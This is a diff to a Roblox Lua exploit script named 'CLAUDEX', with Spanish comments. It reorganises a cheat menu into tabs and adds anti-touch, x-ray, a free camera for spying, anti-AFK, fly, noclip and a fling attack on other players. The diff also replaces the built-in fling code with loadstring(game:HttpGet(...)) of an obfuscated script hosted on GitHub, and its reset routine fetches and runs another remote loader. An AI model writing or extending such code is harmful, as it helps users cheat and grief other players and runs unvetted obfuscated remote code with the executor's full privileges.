@@ -334,100 +334,6 @@ local function _md()
 	LP.CharacterAdded:Connect(function(c) if _gen ~= _mg then return end _om(c) end)
 end
 
--- ============ LOADING ============
-do
-	local TW = game:GetService("TweenService")
-	local _lsg = _gui()
-	local ti = TweenInfo.new
-
-	local bg = Instance.new("Frame")
-	bg.Size = UDim2.new(1, 0, 1, 0)
-	bg.BackgroundColor3 = C3_BLACK
-	bg.BackgroundTransparency = 0.3
-	bg.BorderSizePixel = 0
-	bg.Parent = _lsg
-
-	local star = Instance.new("TextLabel")
-	star.Size = UDim2.new(0, 60, 0, 60)
-	star.Position = UDim2.new(0.5, -30, 0.4, -30)
-	star.BackgroundTransparency = 1
-	star.Text = "\226\156\180"
-	star.TextColor3 = C3_CLAUDEX
-	star.Font = Enum.Font.GothamBold
-	star.TextSize = 50
-	star.TextTransparency = 1
-	star.Parent = bg
-
-	local ttl = Instance.new("TextLabel")
-	ttl.Size = UDim2.new(0, 200, 0, 30)
-	ttl.Position = UDim2.new(0.5, -100, 0.4, 35)
-	ttl.BackgroundTransparency = 1
-	ttl.Text = "CLAUDEX"
-	ttl.TextColor3 = C3_CLAUDEX
-	ttl.Font = Enum.Font.GothamBold
-	ttl.TextSize = 24
-	ttl.TextTransparency = 1
-	ttl.Parent = bg
-
-	local barBg = Instance.new("Frame")
-	barBg.Size = UDim2.new(0, 200, 0, 4)
-	barBg.Position = UDim2.new(0.5, -100, 0.4, 75)
-	barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-	barBg.BorderSizePixel = 0
-	barBg.BackgroundTransparency = 1
-	barBg.Parent = bg
-	Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 2)
-
-	local barF = Instance.new("Frame")
-	barF.Size = UDim2.new(0, 0, 1, 0)
-	barF.BackgroundColor3 = C3_CLAUDEX
-	barF.BorderSizePixel = 0
-	barF.BackgroundTransparency = 1
-	barF.Parent = barBg
-	Instance.new("UICorner", barF).CornerRadius = UDim.new(0, 2)
-
-	local ver = Instance.new("TextLabel")
-	ver.Size = UDim2.new(0, 200, 0, 20)
-	ver.Position = UDim2.new(0.5, -100, 0.4, 85)
-	ver.BackgroundTransparency = 1
-	ver.Text = "v2.0"
-	ver.TextColor3 = Color3.fromRGB(150, 150, 150)
-	ver.Font = Enum.Font.Gotham
-	ver.TextSize = 10
-	ver.TextTransparency = 1
-	ver.Parent = bg
-
-	TW:Create(star, ti(0.4, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
-	TW:Create(ttl, ti(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
-	TW:Create(barBg, ti(0.3, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
-	TW:Create(barF, ti(0.3, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
-	TW:Create(ver, ti(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
-
-	task.wait(0.3)
-	TW:Create(barF, ti(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
-
-	task.spawn(function()
-		for i = 1, 3 do
-			TW:Create(star, ti(0.2, Enum.EasingStyle.Quad), {TextSize = 55}):Play()
-			task.wait(0.2)
-			TW:Create(star, ti(0.2, Enum.EasingStyle.Quad), {TextSize = 45}):Play()
-			task.wait(0.2)
-		end
-	end)
-
-	task.wait(1.5)
-
-	TW:Create(bg, ti(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-	TW:Create(star, ti(0.3, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-	TW:Create(ttl, ti(0.3, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-	TW:Create(barBg, ti(0.3, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-	TW:Create(barF, ti(0.3, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-	TW:Create(ver, ti(0.3, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-
-	task.wait(0.5)
-	_lsg:Destroy()
-end
-
 -- ============ TP ============
 local _sg = _gui()
 _AT._sg = _sg
@@ -461,6 +367,22 @@ local _antiRagCons = {}
 local _antiRagCharCon
 local _clearAntiRag
 local _yupiSpd = 10
+local _fpsBoost = false
+local _fpsOG = {}
+local _fpsDisabled = {}
+local _fpbb
+local _antiTouch = false
+local _atCon
+local _atb
+local _xray = false
+local _xrayParts = {}
+local _xrb
+local _freeCam = false
+local _fcPart, _fcCon
+local _fcb
+local _antiAfk = false
+local _afkCon
+local _afkb
 local Lighting = game:GetService("Lighting")
 
 local _tb = Instance.new("TextButton")
@@ -630,13 +552,11 @@ local function _doRST()
 		_infJump = false
 		if _ijCon then pcall(function() _ijCon:Disconnect() end); _ijCon = nil end
 	end
-	-- restaurar fling
+	-- restaurar fling (motor externo, re-ejecutar para apagar)
 	if _fling then
 		_fling = false
-		if _flingCon then pcall(function() _flingCon:Disconnect() end); _flingCon = nil end
 		pcall(function()
-			local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-			if hrp then hrp.Velocity = V3_ZERO; hrp.RotVelocity = V3_ZERO end
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
 		end)
 	end
 	-- restaurar anti-rag
@@ -658,6 +578,41 @@ local function _doRST()
 			if hum then hum.WalkSpeed = 16 end
 		end)
 	end
+	-- restaurar fps boost
+	if _fpsBoost then
+		_fpsBoost = false
+		pcall(function() Lighting.GlobalShadows = _fpsOG.gs ~= nil and _fpsOG.gs or true end)
+		for _, v in ipairs(_fpsDisabled) do pcall(function() v.Enabled = true end) end
+		_fpsDisabled = {}
+	end
+	-- restaurar anti-touch
+	if _antiTouch then
+		_antiTouch = false
+		if _atCon then pcall(function() _atCon:Disconnect() end); _atCon = nil end
+	end
+	-- restaurar x-ray
+	if _xray then
+		_xray = false
+		for _, d in ipairs(_xrayParts) do pcall(function() d.part.Transparency = d.orig end) end
+		_xrayParts = {}
+	end
+	-- restaurar free cam
+	if _freeCam then
+		_freeCam = false
+		if _fcCon then pcall(function() _fcCon:Disconnect() end); _fcCon = nil end
+		if _fcPart then pcall(function() _fcPart:Destroy() end); _fcPart = nil end
+		pcall(function()
+			local cam = workspace.CurrentCamera
+			cam.CameraType = Enum.CameraType.Custom
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then cam.CameraSubject = hum end
+		end)
+	end
+	-- restaurar anti-afk
+	if _antiAfk then
+		_antiAfk = false
+		if _afkCon then pcall(function() _afkCon:Disconnect() end); _afkCon = nil end
+	end
 	-- destruir todo y recargar desde GitHub
 	for pl, objs in pairs(_obj) do
 		for _, o in pairs(objs) do pcall(function() o:Destroy() end) end
@@ -667,7 +622,7 @@ local function _doRST()
 	_G._ESP_LOADED = nil
 	task.wait(0.3)
 	local ok = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/eidanexb-dotcom/-mis-scripts/refs/heads/main/esp.lua?nocache=" .. tostring(tick()) .. tostring(math.random(100000, 999999)), true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/eidanexb-dotcom/-mis-scripts/refs/heads/main/Loder-CLAUDEX.lua?nocache=" .. tostring(tick()) .. tostring(math.random(100000, 999999)), true))()
 	end)
 	if not ok then _rstBusy = false end
 end
@@ -911,43 +866,28 @@ _dtab.Name = _rn()
 _dtab.Parent = _dsg
 Instance.new("UICorner", _dtab).CornerRadius = UDim.new(0, 6)
 
-local _dpanel = Instance.new("ScrollingFrame")
-_dpanel.Size = UDim2.new(0, 300, 0, 200)
+local _dpanel = Instance.new("Frame")
+_dpanel.Size = UDim2.new(0, 300, 0, 280)
 _dpanel.Position = UDim2.new(0.5, -150, -1, 0)
 _dpanel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 _dpanel.BackgroundTransparency = 0.15
 _dpanel.BorderSizePixel = 0
-_dpanel.ScrollBarThickness = 4
-_dpanel.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+_dpanel.ClipsDescendants = true
 _dpanel.Name = _rn()
 _dpanel.Parent = _dsg
 Instance.new("UICorner", _dpanel).CornerRadius = UDim.new(0, 10)
 
-local _dll = Instance.new("UIListLayout")
-_dll.Padding = UDim.new(0, 4)
-_dll.SortOrder = Enum.SortOrder.LayoutOrder
-_dll.Parent = _dpanel
-_dll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-	_dpanel.CanvasSize = UDim2.new(0, 0, 0, _dll.AbsoluteContentSize.Y + 20)
-end)
-
-local _dpad = Instance.new("UIPadding")
-_dpad.PaddingTop = UDim.new(0, 8)
-_dpad.PaddingLeft = UDim.new(0, 8)
-_dpad.PaddingRight = UDim.new(0, 8)
-_dpad.Parent = _dpanel
-
+-- Header
 local _dhdr = Instance.new("Frame")
 _dhdr.Size = UDim2.new(1, 0, 0, 28)
 _dhdr.BackgroundTransparency = 1
-_dhdr.LayoutOrder = 0
 _dhdr.Name = _rn()
 _dhdr.Parent = _dpanel
 
 local _dstar = Instance.new("TextLabel")
 _dstar.Size = UDim2.new(0, 28, 0, 28)
 _dstar.BackgroundTransparency = 1
-_dstar.Text = "✴"
+_dstar.Text = "\226\156\180"
 _dstar.TextColor3 = C3_CLAUDEX
 _dstar.Font = Enum.Font.GothamBold
 _dstar.TextSize = 20
@@ -975,7 +915,97 @@ _dline.BorderSizePixel = 0
 _dline.Name = _rn()
 _dline.Parent = _dhdr
 
-local function _dbtn(txt, order)
+-- Tab bar (izquierda)
+local _tabBar = Instance.new("Frame")
+_tabBar.Size = UDim2.new(0, 70, 1, -30)
+_tabBar.Position = UDim2.new(0, 0, 0, 30)
+_tabBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+_tabBar.BackgroundTransparency = 0.3
+_tabBar.BorderSizePixel = 0
+_tabBar.Name = _rn()
+_tabBar.Parent = _dpanel
+
+local _tabBarLL = Instance.new("UIListLayout")
+_tabBarLL.Padding = UDim.new(0, 2)
+_tabBarLL.SortOrder = Enum.SortOrder.LayoutOrder
+_tabBarLL.Parent = _tabBar
+
+local _tabBarPad = Instance.new("UIPadding")
+_tabBarPad.PaddingTop = UDim.new(0, 4)
+_tabBarPad.PaddingLeft = UDim.new(0, 3)
+_tabBarPad.PaddingRight = UDim.new(0, 3)
+_tabBarPad.Parent = _tabBar
+
+-- Tab content (derecha, uno por tab)
+local _tabFrames = {}
+local _tabNames = {"General", "Combate", "Move", "Visual"}
+local _tabColors = {C3_ON, C3_RED, Color3.fromRGB(100, 200, 255), Color3.fromRGB(255, 200, 0)}
+
+for i = 1, #_tabNames do
+	local sf = Instance.new("ScrollingFrame")
+	sf.Size = UDim2.new(1, -74, 1, -30)
+	sf.Position = UDim2.new(0, 74, 0, 30)
+	sf.BackgroundTransparency = 1
+	sf.ScrollBarThickness = 4
+	sf.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+	sf.Visible = (i == 1)
+	sf.Name = _rn()
+	sf.Parent = _dpanel
+	local ll = Instance.new("UIListLayout")
+	ll.Padding = UDim.new(0, 4)
+	ll.SortOrder = Enum.SortOrder.LayoutOrder
+	ll.Parent = sf
+	ll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		sf.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y + 10)
+	end)
+	local pad = Instance.new("UIPadding")
+	pad.PaddingTop = UDim.new(0, 4)
+	pad.PaddingLeft = UDim.new(0, 4)
+	pad.PaddingRight = UDim.new(0, 4)
+	pad.Parent = sf
+	_tabFrames[i] = sf
+end
+
+-- Tab buttons
+local _currentTab = 1
+local _tabBtns = {}
+
+local function _switchTab(idx)
+	_currentTab = idx
+	for i = 1, #_tabFrames do _tabFrames[i].Visible = (i == idx) end
+	for i = 1, #_tabBtns do
+		if i == idx then
+			_tabBtns[i].BackgroundColor3 = _tabColors[i]
+			_tabBtns[i].BackgroundTransparency = 0.3
+			_tabBtns[i].TextColor3 = C3_WHITE
+		else
+			_tabBtns[i].BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+			_tabBtns[i].BackgroundTransparency = 0.3
+			_tabBtns[i].TextColor3 = Color3.fromRGB(130, 130, 130)
+		end
+	end
+end
+
+for i = 1, #_tabNames do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, 0, 0, 28)
+	btn.BackgroundColor3 = (i == 1) and _tabColors[i] or Color3.fromRGB(35, 35, 35)
+	btn.BackgroundTransparency = 0.3
+	btn.TextColor3 = (i == 1) and C3_WHITE or Color3.fromRGB(130, 130, 130)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 9
+	btn.Text = _tabNames[i]
+	btn.LayoutOrder = i
+	btn.Name = _rn()
+	btn.Parent = _tabBar
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
+	local ci = i
+	btn.MouseButton1Click:Connect(function() _switchTab(ci) end)
+	_tabBtns[i] = btn
+end
+
+-- Builder: tab 1=General 2=Combate 3=Move 4=Visual
+local function _dbtn(txt, order, tab)
 	local b = Instance.new("TextButton")
 	b.Size = UDim2.new(1, 0, 0, 30)
 	b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
@@ -986,24 +1016,24 @@ local function _dbtn(txt, order)
 	b.Text = txt
 	b.LayoutOrder = order
 	b.Name = _rn()
-	b.Parent = _dpanel
+	b.Parent = _tabFrames[tab or 1]
 	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 	return b
 end
 
-_ncb = _dbtn("NOCLIP: OFF", 1)
-_brb = _dbtn("LUZ: OFF", 2)
-_dsb = _dbtn("DESLIZAMIENTO: OFF", 3)
-_grb = _dbtn("GRAVEDAD 0: OFF", 5)
+_ncb = _dbtn("NOCLIP: OFF", 1, 1)
+_brb = _dbtn("LUZ: OFF", 2, 1)
+_dsb = _dbtn("DESLIZAMIENTO: OFF", 3, 1)
+_grb = _dbtn("GRAVEDAD 0: OFF", 5, 1)
 
--- INVI ON/OFF (en dropdown)
-_ivL = _dbtn("INVI: OFF", 9)
+-- INVI ON/OFF (Visual tab)
+_ivL = _dbtn("INVI: OFF", 3, 4)
 _ivL.MouseButton1Click:Connect(function()
 	_toggleInvis()
 end)
 
 -- ANTI-RAG (godmode + anti-ragdoll + anti-sit forzado)
-local _arb = _dbtn("ANTI-RAG: OFF", 10)
+local _arb = _dbtn("ANTI-RAG: OFF", 1, 2)
 
 _clearAntiRag = function()
 	for _, c in ipairs(_antiRagCons) do pcall(function() c:Disconnect() end) end
@@ -1053,40 +1083,24 @@ end
 
 _arb.MouseButton1Click:Connect(_toggleAntiRag)
 
--- FLING (licuadora humana)
-local _flb = _dbtn("FLING: OFF", 11)
+-- FLING (motor externo FE, igual que INVI)
+local _flb = _dbtn("FLING: OFF", 2, 2)
+local _flingBusy = false
 
 _flb.MouseButton1Click:Connect(function()
+	if _flingBusy then return end
+	_flingBusy = true
 	_fling = not _fling
 	_flb.Text = _fling and "FLING: ON" or "FLING: OFF"
 	_flb.TextColor3 = _fling and C3_ON or C3_OFF
-	if _fling then
-		_flingCon = RS.Heartbeat:Connect(function()
-			if not _fling then return end
-			local ch = LP.Character
-			if not ch then return end
-			local hrp = ch:FindFirstChild("HumanoidRootPart")
-			if not hrp then return end
-			hrp.Velocity = Vector3.new(9e9, 9e9, 9e9)
-			hrp.RotVelocity = Vector3.new(0, 9e9, 0)
-			for _, v in ipairs(ch:GetDescendants()) do
-				if v:IsA("BasePart") then v.CanCollide = false end
-			end
-		end)
-	else
-		if _flingCon then _flingCon:Disconnect(); _flingCon = nil end
-		pcall(function()
-			local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
-			if hrp then
-				hrp.Velocity = V3_ZERO
-				hrp.RotVelocity = V3_ZERO
-			end
-		end)
-	end
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
+	end)
+	_flingBusy = false
 end)
 
 -- FLY (BodyVelocity + BodyGyro, WASD Space Ctrl)
-local _fyb = _dbtn("FLY: OFF", 12)
+local _fyb = _dbtn("FLY: OFF", 1, 3)
 
 _fyb.MouseButton1Click:Connect(function()
 	_flyOn = not _flyOn
@@ -1126,7 +1140,7 @@ _fyb.MouseButton1Click:Connect(function()
 end)
 
 -- INF JUMP (salto infinito)
-local _ijb = _dbtn("INF JUMP: OFF", 13)
+local _ijb = _dbtn("INF JUMP: OFF", 2, 3)
 
 _ijb.MouseButton1Click:Connect(function()
 	_infJump = not _infJump
@@ -1145,6 +1159,171 @@ _ijb.MouseButton1Click:Connect(function()
 	end
 end)
 
+-- FPS BOOST (mata sombras, particulas, efectos visuales)
+_fpbb = _dbtn("FPS BOOST: OFF", 1, 4)
+
+local function _toggleFpsBoost()
+	_fpsBoost = not _fpsBoost
+	_fpbb.Text = _fpsBoost and "FPS BOOST: ON" or "FPS BOOST: OFF"
+	_fpbb.TextColor3 = _fpsBoost and C3_ON or C3_OFF
+	if _fpsBoost then
+		_fpsOG = { gs = Lighting.GlobalShadows }
+		Lighting.GlobalShadows = false
+		_fpsDisabled = {}
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if (v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles")) and v.Enabled then
+				v.Enabled = false
+				tinsert(_fpsDisabled, v)
+			end
+		end
+		pcall(function()
+			local t = workspace:FindFirstChildOfClass("Terrain")
+			if t then t.WaterWaveSize = 0; t.WaterReflectance = 0; t.Decoration = false end
+		end)
+	else
+		pcall(function() Lighting.GlobalShadows = _fpsOG.gs ~= nil and _fpsOG.gs or true end)
+		for _, v in ipairs(_fpsDisabled) do pcall(function() v.Enabled = true end) end
+		_fpsDisabled = {}
+		pcall(function()
+			local t = workspace:FindFirstChildOfClass("Terrain")
+			if t then t.Decoration = true end
+		end)
+	end
+end
+_fpbb.MouseButton1Click:Connect(_toggleFpsBoost)
+
+-- ANTI-TOUCH (inmunidad a killbricks y trampas)
+_atb = _dbtn("ANTI-TOUCH: OFF", 3, 2)
+
+local function _toggleAntiTouch()
+	_antiTouch = not _antiTouch
+	_atb.Text = _antiTouch and "ANTI-TOUCH: ON" or "ANTI-TOUCH: OFF"
+	_atb.TextColor3 = _antiTouch and C3_ON or C3_OFF
+	if _antiTouch then
+		_atCon = RS.Heartbeat:Connect(function()
+			if not _antiTouch then return end
+			if _tick % 3 ~= 0 then return end
+			local ch = LP.Character
+			if not ch then return end
+			local hrp = ch:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+			pcall(function()
+				local parts = workspace:GetPartBoundsInRadius(hrp.Position, 15)
+				for _, p in ipairs(parts) do
+					if not p:IsDescendantOf(ch) then p.CanTouch = false end
+				end
+			end)
+		end)
+	else
+		if _atCon then _atCon:Disconnect(); _atCon = nil end
+	end
+end
+_atb.MouseButton1Click:Connect(_toggleAntiTouch)
+
+-- X-RAY (paredes transparentes)
+_xrb = _dbtn("X-RAY: OFF", 2, 4)
+
+local function _toggleXray()
+	_xray = not _xray
+	_xrb.Text = _xray and "X-RAY: ON" or "X-RAY: OFF"
+	_xrb.TextColor3 = _xray and C3_ON or C3_OFF
+	if _xray then
+		_xrayParts = {}
+		local chars = {}
+		for _, pl in ipairs(Players:GetPlayers()) do
+			if pl.Character then chars[pl.Character] = true end
+		end
+		for _, v in ipairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") then
+				local skip = false
+				for c in pairs(chars) do
+					if v:IsDescendantOf(c) then skip = true; break end
+				end
+				if not skip and v.Transparency < 0.3 and v.Size.Magnitude > 5 then
+					pcall(function()
+						tinsert(_xrayParts, {part = v, orig = v.Transparency})
+						v.Transparency = 0.75
+					end)
+				end
+			end
+		end
+	else
+		for _, d in ipairs(_xrayParts) do
+			pcall(function() d.part.Transparency = d.orig end)
+		end
+		_xrayParts = {}
+	end
+end
+_xrb.MouseButton1Click:Connect(_toggleXray)
+
+-- FREE CAM (camara libre para espiar)
+_fcb = _dbtn("FREE CAM: OFF", 3, 3)
+
+local function _toggleFreeCam()
+	_freeCam = not _freeCam
+	_fcb.Text = _freeCam and "FREE CAM: ON" or "FREE CAM: OFF"
+	_fcb.TextColor3 = _freeCam and C3_ON or C3_OFF
+	if _freeCam then
+		local cam = workspace.CurrentCamera
+		_fcPart = Instance.new("Part")
+		_fcPart.Size = Vector3.new(1, 1, 1)
+		_fcPart.Transparency = 1
+		_fcPart.Anchored = true
+		_fcPart.CanCollide = false
+		_fcPart.Name = _rn()
+		_fcPart.CFrame = cam.CFrame
+		_fcPart.Parent = workspace
+		cam.CameraType = Enum.CameraType.Custom
+		cam.CameraSubject = _fcPart
+		_fcCon = RS.RenderStepped:Connect(function(dt)
+			if not _freeCam or not _fcPart then return end
+			local c = workspace.CurrentCamera
+			local mv = V3_ZERO
+			if UIS:IsKeyDown(Enum.KeyCode.W) then mv = mv + c.CFrame.LookVector end
+			if UIS:IsKeyDown(Enum.KeyCode.S) then mv = mv - c.CFrame.LookVector end
+			if UIS:IsKeyDown(Enum.KeyCode.A) then mv = mv - c.CFrame.RightVector end
+			if UIS:IsKeyDown(Enum.KeyCode.D) then mv = mv + c.CFrame.RightVector end
+			if UIS:IsKeyDown(Enum.KeyCode.Space) then mv = mv + Vector3.new(0, 1, 0) end
+			if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then mv = mv - Vector3.new(0, 1, 0) end
+			if mv.Magnitude > 0 then _fcPart.CFrame = _fcPart.CFrame + mv.Unit * 60 * dt end
+		end)
+	else
+		if _fcCon then _fcCon:Disconnect(); _fcCon = nil end
+		if _fcPart then pcall(function() _fcPart:Destroy() end); _fcPart = nil end
+		pcall(function()
+			local cam = workspace.CurrentCamera
+			cam.CameraType = Enum.CameraType.Custom
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then cam.CameraSubject = hum end
+		end)
+	end
+end
+_fcb.MouseButton1Click:Connect(_toggleFreeCam)
+
+-- ANTI-AFK (no te kickean por inactividad)
+_afkb = _dbtn("ANTI-AFK: OFF", 6, 1)
+
+local function _toggleAntiAfk()
+	_antiAfk = not _antiAfk
+	_afkb.Text = _antiAfk and "ANTI-AFK: ON" or "ANTI-AFK: OFF"
+	_afkb.TextColor3 = _antiAfk and C3_ON or C3_OFF
+	if _antiAfk then
+		local ok, VU = pcall(function() return game:GetService("VirtualUser") end)
+		if ok and VU then
+			_afkCon = LP.Idled:Connect(function()
+				if not _antiAfk then return end
+				pcall(function()
+					VU:CaptureController()
+					VU:ClickButton2(Vector2.new())
+				end)
+			end)
+		end
+	else
+		if _afkCon then _afkCon:Disconnect(); _afkCon = nil end
+	end
+end
+_afkb.MouseButton1Click:Connect(_toggleAntiAfk)
+
 -- SLIDER YUPI
 local _yupiMin = 1
 local _yupiMax = 1000
@@ -1152,10 +1331,10 @@ local _yupiMax = 1000
 _yuFrame = Instance.new("Frame")
 _yuFrame.Size = UDim2.new(1, 0, 0, 30)
 _yuFrame.BackgroundTransparency = 1
-_yuFrame.LayoutOrder = 6
+_yuFrame.LayoutOrder = 4
 _yuFrame.Name = _rn()
 _yuFrame.Visible = false
-_yuFrame.Parent = _dpanel
+_yuFrame.Parent = _tabFrames[3]
 
 local _yuLabel = Instance.new("TextLabel")
 _yuLabel.Size = UDim2.new(0, 65, 1, 0)
@@ -1221,10 +1400,10 @@ local _spMax = 500
 _spFrame = Instance.new("Frame")
 _spFrame.Size = UDim2.new(1, 0, 0, 30)
 _spFrame.BackgroundTransparency = 1
-_spFrame.LayoutOrder = 7
+_spFrame.LayoutOrder = 5
 _spFrame.Name = _rn()
 _spFrame.Visible = false
-_spFrame.Parent = _dpanel
+_spFrame.Parent = _tabFrames[3]
 
 local _spLabel = Instance.new("TextLabel")
 _spLabel.Size = UDim2.new(0, 55, 1, 0)
@@ -1292,7 +1471,7 @@ _slFrame.Size = UDim2.new(1, 0, 0, 30)
 _slFrame.BackgroundTransparency = 1
 _slFrame.LayoutOrder = 4
 _slFrame.Name = _rn()
-_slFrame.Parent = _dpanel
+_slFrame.Parent = _tabFrames[1]
 
 local _slLabel = Instance.new("TextLabel")
 _slLabel.Size = UDim2.new(0, 50, 1, 0)
